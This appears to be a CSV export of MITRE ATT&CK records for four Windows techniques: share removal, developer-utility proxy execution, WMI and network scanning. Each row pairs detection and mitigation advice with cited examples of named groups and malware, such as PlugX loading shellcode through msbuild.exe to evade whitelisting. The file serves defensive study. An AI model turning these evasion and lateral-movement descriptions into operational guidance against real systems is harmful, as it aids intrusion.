706,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']","['[[Group/G0027|Threat Group-3390]] has detached network shares after exfiltrating files, likely to evade detection.[[CiteRef::SecureWorks BRONZE UNION June 2017]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],[],['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
707,"['The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.']",['Application whitelisting'],[],['Casey Smith'],['Process monitoring'],"['A version of [[Software/S0013|PlugX]] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.[[CiteRef::Palo Alto PlugX June 2017]]']",['DragonOK'],['DragonOK'],['G0017'],"['MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe may not be necessary within a given environment and should be removed if not used.\n\nUse application whitelisting configured to block execution of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe if they are not required for a given system or network to prevent potential misuse by adversaries.[[CiteRef::Microsoft GitHub Device Guard CI Policies]][[CiteRef::Exploit Monday Mitigate Device Guard Bypases]][[CiteRef::GitHub mattifestation DeviceGuardBypass]][[CiteRef::SubTee MSBuild]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']","Software: PlugX, Sogu, Kaba","['Defense Evasion', 'Execution']",['Technique/T1127'],['Trusted Developer Utilities'],https://attack.mitre.org/wiki/Technique/T1127
708,"['The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.']",['Application whitelisting'],[],['Casey Smith'],['Process monitoring'],"['A version of [[Software/S0013|PlugX]] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.[[CiteRef::Palo Alto PlugX June 2017]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe may not be necessary within a given environment and should be removed if not used.\n\nUse application whitelisting configured to block execution of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe if they are not required for a given system or network to prevent potential misuse by adversaries.[[CiteRef::Microsoft GitHub Device Guard CI Policies]][[CiteRef::Exploit Monday Mitigate Device Guard Bypases]][[CiteRef::GitHub mattifestation DeviceGuardBypass]][[CiteRef::SubTee MSBuild]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']","Software: PlugX, Sogu, Kaba","['Defense Evasion', 'Execution']",['Technique/T1127'],['Trusted Developer Utilities'],https://attack.mitre.org/wiki/Technique/T1127
709,"['The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.']",['Application whitelisting'],[],['Casey Smith'],['Process monitoring'],"['A version of [[Software/S0013|PlugX]] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.[[CiteRef::Palo Alto PlugX June 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe may not be necessary within a given environment and should be removed if not used.\n\nUse application whitelisting configured to block execution of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe if they are not required for a given system or network to prevent potential misuse by adversaries.[[CiteRef::Microsoft GitHub Device Guard CI Policies]][[CiteRef::Exploit Monday Mitigate Device Guard Bypases]][[CiteRef::GitHub mattifestation DeviceGuardBypass]][[CiteRef::SubTee MSBuild]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']","Software: PlugX, Sogu, Kaba","['Defense Evasion', 'Execution']",['Technique/T1127'],['Trusted Developer Utilities'],https://attack.mitre.org/wiki/Technique/T1127
710,"['The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.']",['Application whitelisting'],[],['Casey Smith'],['Process monitoring'],"['A version of [[Software/S0013|PlugX]] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.[[CiteRef::Palo Alto PlugX June 2017]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe may not be necessary within a given environment and should be removed if not used.\n\nUse application whitelisting configured to block execution of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe if they are not required for a given system or network to prevent potential misuse by adversaries.[[CiteRef::Microsoft GitHub Device Guard CI Policies]][[CiteRef::Exploit Monday Mitigate Device Guard Bypases]][[CiteRef::GitHub mattifestation DeviceGuardBypass]][[CiteRef::SubTee MSBuild]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']","Software: PlugX, Sogu, Kaba","['Defense Evasion', 'Execution']",['Technique/T1127'],['Trusted Developer Utilities'],https://attack.mitre.org/wiki/Technique/T1127
711,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['The [[Group/G0009|Deep Panda]] group is known to utilize WMI for lateral movement.[[CiteRef::Alperovitch 2014]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
712,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0151|HALFBAKED]] can use WMI queries to gather system information.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",Software: HALFBAKED,['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
713,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['A [[Software/S0089|BlackEnergy]] 2  plug-in uses WMI to gather victim host details.[[CiteRef::Securelist BlackEnergy Feb 2015]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']","Software: BlackEnergy, Black Energy",['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
714,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0038|Stealth Falcon]] malware gathers system information via Windows Management Instrumentation (WMI).[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
715,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can use WMI to deliver a payload to a remote host.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",Software: Cobalt Strike,['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
716,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0156|KOMPROGO]] is capable of running WMI queries.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",Software: KOMPROGO,['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
717,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0016|APT29]] used WMI to steal credentials and execute backdoors at a future time.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
718,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.[[CiteRef::Novetta Blockbuster RATs]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
719,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0045|menuPass]] uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Github AD-Pentest-Script]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
720,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['The [[Software/S0062|DustySky]] dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']","Software: DustySky, NeD Worm",['Execution'],['Technique/T1047'],['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
721,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Software/S0125|Remsec]] has a plugin that can perform ARP scanning as well as port scanning.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
722,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Software/S0117|XTunnel]] is capable of probing the network for open ports.[[CiteRef::Invincea XTunnel]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: XTunnel, X-Tunnel, XAPS",['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
723,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Software/S0089|BlackEnergy]] has conducted port scans on a host.[[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
724,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",['[[Software/S0061|HDoor]] scans to identify open ports on the victim. [[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: HDoor, Custom HDoor",['Discovery'],['Technique/T1046'],['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
